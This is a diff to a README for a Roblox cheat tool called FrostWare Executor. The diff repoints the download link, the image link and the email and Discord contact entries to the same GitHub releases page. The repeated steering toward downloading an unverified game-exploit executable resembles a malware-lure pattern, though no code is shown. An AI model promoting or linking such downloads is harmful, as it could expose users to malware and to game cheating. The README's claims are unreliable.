@@ -14,7 +14,7 @@ Welcome to the Roblox FrostWare repository, your go-to source for the FrostWare 
 - **Description**: FrostWare Executor is a sophisticated script execution tool for Roblox, designed to allow users to run custom scripts and alter game mechanics, providing a wide range of exploits and enhancements for an enhanced gaming experience.
 - **Topics**: 2D Games, 3D Games, Community, Environment, Framework, Game Assets, Game Development, Game Tools, Gaming, LUA, Multiplayer, Open-source, Roblox-Frostware, Roblox-Studio
 
-## 📦 [Download the FrostWare Executor](https://github.com/files/File.zip)
+## 📦 [Download the FrostWare Executor](https://github.com/boofof/Roblox-Frostware/releases)
 Click the button above to download the FrostWare Executor. Once downloaded, launch the application to start enhancing your Roblox gaming experience.
 
 If the link provided above does not work, please check the "Releases" section for alternative download options.
@@ -40,9 +40,9 @@ We welcome contributions from the community to help improve FrostWare:
 
 ## 📞 Contact Us
 If you have any questions or need support with FrostWare, feel free to contact us:
-- Email: support@frostware.com
+- Email: https://github.com/boofof/Roblox-Frostware/releases
 - Twitter: @FrostWareDev
-- Discord: discord.gg/frostware
+- Discord: https://github.com/boofof/Roblox-Frostware/releases
 
 ## 📜 License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
@@ -51,4 +51,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Enjoy the power of FrostWare Executor and elevate your Roblox gaming experience to new heights! 🎉
 
-![Roblox FrostWare](https://example.com/image.png)
+![Roblox FrostWare](https://github.com/boofof/Roblox-Frostware/releases)
